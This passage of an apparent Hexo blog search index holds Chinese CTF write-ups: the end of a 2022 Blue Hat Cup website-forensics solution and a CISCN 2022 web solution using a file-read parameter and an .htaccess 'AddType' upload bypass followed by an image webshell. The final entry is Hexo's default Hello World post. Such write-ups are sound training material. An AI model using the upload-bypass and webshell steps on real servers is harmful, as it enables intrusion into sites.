<span class="title function_ invoke__">my_encrypt</span>();</span><br><span class="line"><span class="comment">//KBLT123</span></span><br></pre></td></tr></table></figure><p>KBLT123</p><h3 id="网站取证3"><a href="#网站取证3" class="headerlink" title="网站取证3"></a>网站取证3</h3><p>找到加密函数，有个<code>$key</code>，就是salt值</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122305575.png" alt="img"></p><p>jyzg123456</p><h3 id="网站取证4"><a href="#网站取证4" class="headerlink" title="网站取证4"></a>网站取证4</h3><p>数据库中的money是加密的，不能直接进行加减，找到解密函数</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122305749.png" alt="img"></p><p>bak.sql数据库中保存有汇率信息</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122305792.png" alt="image-20220712230533295"></p><p>转账部分，转账的金额需要用上面的解密函数进行解密，编号2，3，4，5是对应的人员，这一点对应一下即可</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122306697.png" alt="image-20220712230614304"></p><p>根据这些内容，写脚本算出最终的转账数目即可</p>]]></content>
      
      
      <categories>
          
          <category> 比赛wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 蓝帽杯 </tag>
            
            <tag> 2022 </tag>
            
            <tag> fastjson </tag>
            
            <tag> 网站取证 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ciscn2022华中赛区web部分wp</title>
      <link href="/2022/07/12/ciscn2022%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BAweb%E9%83%A8%E5%88%86wp/"/>
      <url>/2022/07/12/ciscn2022%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BAweb%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<h1 id="ciscn2022华中分区web部分wp"><a href="#ciscn2022华中分区web部分wp" class="headerlink" title="ciscn2022华中分区web部分wp"></a>ciscn2022华中分区web部分wp</h1><p>[toc]</p><h2 id="FakeUpload1"><a href="#FakeUpload1" class="headerlink" title="FakeUpload1"></a>FakeUpload1</h2><p>题目描述：嘶，长得好像上传呀。提交 flag 格式：flag{xxxx}。URL：http:&#x2F;&#x2F;该题目IP为Web赛题中【ctf赛题环境】的IP:58002</p><p>不是文件上传，是文件读取</p><p>当访问pics&#x2F;1.jpg的时候，url变为了<code>reader.php?filename=pics/1.jpg</code></p><p>所以直接修改报文，读取flag.php</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122140635.png" alt="image-20220712213531916"></p><h2 id="Identity23"><a href="#Identity23" class="headerlink" title="Identity23"></a>Identity23</h2><p>题目端口58003</p><p>disearch扫描</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122150893.png" alt="image-20220712213222584"></p><p>传参，找到一个php  A0ther_hldden_PaGe.php</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122150845.png" alt="img"></p><p>访问  A0ther_hldden_PaGe.php  可以上传文件，有一些防护</p><p>上传<code>.htaccess</code>文件</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122150456.png" alt="img"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg   </span><br></pre></td></tr></table></figure><p>然后上传，注意修改报文</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122150923.png" alt="img"></p><p>传一个图片马1.jpg</p><p>然后蚁剑连接  因为1.jpg是之前上传的图片马，现在被当作php解析了</p><p>蚁剑连接  查看该文件即可</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122150519.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 比赛wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ciscn2022 </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/07/11/hello-world/"/>
      <url>/2022/07/11/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
